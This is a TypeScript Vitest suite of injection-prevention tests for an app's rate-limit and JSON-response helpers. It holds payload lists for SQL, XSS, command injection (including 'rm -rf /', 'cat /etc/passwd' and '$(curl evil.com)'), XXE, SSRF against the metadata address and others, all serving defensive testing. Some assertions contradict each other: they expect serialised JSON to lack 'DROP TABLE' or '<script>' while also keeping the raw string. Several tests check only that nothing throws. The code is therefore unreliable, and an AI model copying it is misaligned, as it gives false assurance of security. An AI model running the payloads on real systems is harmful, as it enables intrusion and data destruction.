// __tests__/security/injection-prevention.test.ts
import { describe, it, expect } from 'vitest';
import { 
  checkEmailRateLimit, 
  formatRetryAfter 
} from '@/lib/server/rate-limit';
import {
  jsonSuccess,
  jsonError,
  badRequest,
} from '@/lib/server/api-response';
import {
  sqlInjectionPayloads,
  xssPayloads,
  testSecurityPayload,
} from '../utils/test-helpers';

describe('Security - Injection Prevention', () => {
  describe('SQL Injection Prevention', () => {
    it('should sanitize SQL injection in email rate limit', () => {
      sqlInjectionPayloads.forEach(payload => {
        // Should not crash or allow bypass
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
      });
    });

    it('should handle SQL injection attempts in formatRetryAfter', () => {
      // Attempting to inject through number parameter
      const maliciousInputs = [
        "1'; DROP TABLE users--",
        "1 OR 1=1",
      ];

      maliciousInputs.forEach(input => {
        // Should handle gracefully (parseFloat will convert to number)
        const result = formatRetryAfter(parseFloat(input) || 0);
        expect(typeof result).toBe('string');
      });
    });

    it('should prevent SQL injection in JSON responses', async () => {
      const maliciousData = {
        name: "'; DROP TABLE users--",
        email: "admin'--@example.com",
      };

      const response = jsonSuccess(maliciousData);
      const body = await response.json();

      // Data should be properly escaped in JSON
      const jsonString = JSON.stringify(body);
      expect(jsonString).not.toContain('DROP TABLE');
      expect(body.data.name).toBe(maliciousData.name); // But preserve original data
    });

    it('should prevent SQL injection in error messages', async () => {
      const maliciousMessage = "User not found'; DROP TABLE users--";
      const response = jsonError(maliciousMessage);
      const body = await response.json();

      // Error message should be safely stored
      expect(body.error.message).toBe(maliciousMessage);
      // But when serialized, should be safe
      expect(JSON.stringify(body)).toBeDefined();
    });
  });

  describe('XSS Prevention', () => {
    it('should prevent XSS in email parameter', () => {
      xssPayloads.forEach(payload => {
        // Email validation should reject or sanitize XSS attempts
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
        
        // The payload should not be executed (no <script> tags should work)
        const result = checkEmailRateLimit(payload);
        expect(result).toHaveProperty('allowed');
      });
    });

    it('should prevent XSS in JSON responses', async () => {
      const xssAttempt = '<script>alert("XSS")</script>';
      const response = jsonSuccess({ 
        message: xssAttempt,
        userInput: '<img src=x onerror=alert("XSS")>',
      });

      const body = await response.json();
      
      // JSON should be properly escaped
      const jsonString = JSON.stringify(body);
      expect(jsonString).not.toContain('<script>alert');
      
      // But original data should be preserved
      expect(body.data.message).toBe(xssAttempt);
    });

    it('should prevent XSS in error responses', async () => {
      const xssError = '<svg onload=alert("XSS")>';
      const response = badRequest(xssError);
      const body = await response.json();

      // Error message should be safely encoded
      expect(body.error.message).toBe(xssError);
      
      // Content-Type should be application/json
      expect(response.headers.get('Content-Type')).toBe('application/json');
    });

    it('should set security headers', async () => {
      const response = jsonSuccess({ test: true });

      // Should have security headers
      expect(response.headers.get('Content-Type')).toBe('application/json');
      expect(response.headers.get('Cache-Control')).toContain('no-store');
      
      // JSON responses auto-escape dangerous content
      const body = await response.json();
      expect(JSON.stringify(body)).toBeDefined();
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in rate limit identifiers', () => {
      const commandInjectionPayloads = [
        'test@example.com; rm -rf /',
        'test@example.com | cat /etc/passwd',
        'test@example.com && echo "hacked"',
        'test@example.com`whoami`',
        '$(curl evil.com)',
      ];

      commandInjectionPayloads.forEach(payload => {
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
        
        // Should treat as regular string, not execute commands
        const result = checkEmailRateLimit(payload);
        expect(result).toHaveProperty('allowed');
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent path traversal in string inputs', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
      ];

      pathTraversalPayloads.forEach(payload => {
        // Functions should not interpret these as file paths
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection attempts', () => {
      const nosqlPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{$where: "this.password == \'test\'"}',
      ];

      nosqlPayloads.forEach(payload => {
        // Should treat as regular strings, not parse as queries
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection', () => {
      const ldapPayloads = [
        'admin)(&(password=*))',
        '*)(uid=*))(|(uid=*',
        'admin)(|(password=*))',
      ];

      ldapPayloads.forEach(payload => {
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
      });
    });
  });

  describe('Header Injection Prevention', () => {
    it('should prevent CRLF injection in responses', async () => {
      const crlfPayload = "test\r\nX-Injected-Header: malicious";
      const response = jsonError(crlfPayload);

      // Headers should not be injected
      expect(response.headers.get('X-Injected-Header')).toBeNull();
      
      const body = await response.json();
      expect(body.error.message).toBe(crlfPayload);
    });
  });

  describe('Template Injection Prevention', () => {
    it('should prevent template injection', () => {
      const templatePayloads = [
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        '#{7*7}',
        '<%= 7*7 %>',
      ];

      templatePayloads.forEach(payload => {
        const result = checkEmailRateLimit(payload);
        // Should not execute template code
        expect(result).toHaveProperty('allowed');
      });
    });
  });

  describe('JSON Injection Prevention', () => {
    it('should prevent JSON injection in API responses', async () => {
      const maliciousJson = '{"injected": true}';
      const response = jsonSuccess({ 
        userInput: maliciousJson 
      });

      const body = await response.json();
      
      // Should be double-encoded, not parsed as JSON
      expect(typeof body.data.userInput).toBe('string');
      expect(body.data.userInput).toBe(maliciousJson);
    });
  });

  describe('Null Byte Injection Prevention', () => {
    it('should handle null bytes safely', () => {
      const nullBytePayloads = [
        'test@example.com\x00',
        '\x00admin',
        'test\x00@example.com',
      ];

      nullBytePayloads.forEach(payload => {
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
      });
    });
  });

  describe('Unicode/UTF-8 Exploits Prevention', () => {
    it('should handle unicode exploits', () => {
      const unicodePayloads = [
        'test@example.com\u202e', // Right-to-left override
        'test\uFEFF@example.com', // Zero-width no-break space
        'test@example\u200b.com', // Zero-width space
        'тест@example.com', // Cyrillic lookalikes
      ];

      unicodePayloads.forEach(payload => {
        expect(() => checkEmailRateLimit(payload)).not.toThrow();
      });
    });
  });

  describe('Regular Expression DoS (ReDoS) Prevention', () => {
    it('should not be vulnerable to ReDoS', () => {
      const redosPayloads = [
        'a'.repeat(10000) + '@example.com',
        'test@' + 'a'.repeat(10000) + '.com',
        'x'.repeat(50000),
      ];

      redosPayloads.forEach(payload => {
        const start = performance.now();
        
        try {
          checkEmailRateLimit(payload);
        } catch (e) {
          // Acceptable to reject, but should not hang
        }
        
        const duration = performance.now() - start;
        
        // Should complete quickly, not hang
        expect(duration).toBeLessThan(1000);
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should prevent prototype pollution', async () => {
      const pollutionAttempt = {
        '__proto__': { polluted: true },
        'constructor': { prototype: { polluted: true } },
      };

      const response = jsonSuccess(pollutionAttempt);
      const body = await response.json();

      // Check that prototype is not polluted
      expect(({}as any).polluted).toBeUndefined();
      expect(Object.prototype.hasOwnProperty('polluted')).toBe(false);
    });
  });

  describe('Mass Assignment Prevention', () => {
    it('should not allow mass assignment of sensitive fields', async () => {
      const maliciousUpdate = {
        email: 'user@test.com',
        role: 'admin', // Attempting to escalate privileges
        isAdmin: true,
        permissions: ['ALL'],
      };

      const response = jsonSuccess(maliciousUpdate);
      const body = await response.json();

      // Data is accepted but application logic should validate
      expect(body.data).toEqual(maliciousUpdate);
      
      // Note: Actual prevention happens at the business logic level
      // This test ensures JSON handling doesn't introduce vulnerabilities
    });
  });

  describe('XML External Entity (XXE) Prevention', () => {
    it('should not process XML entities in JSON', async () => {
      const xxeAttempt = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
      
      const response = jsonSuccess({ xml: xxeAttempt });
      const body = await response.json();

      // Should be treated as plain string
      expect(body.data.xml).toBe(xxeAttempt);
      expect(body.data.xml).toContain('<!ENTITY');
    });
  });

  describe('Server-Side Request Forgery (SSRF) Prevention', () => {
    it('should not process URLs in unexpected places', async () => {
      const ssrfAttempts = [
        'http://localhost:3000/admin',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'gopher://localhost:25/',
      ];

      for (const url of ssrfAttempts) {
        const response = jsonSuccess({ callback: url });
        const body = await response.json();

        // URL should be stored as string, not fetched
        expect(body.data.callback).toBe(url);
      }
    });
  });
});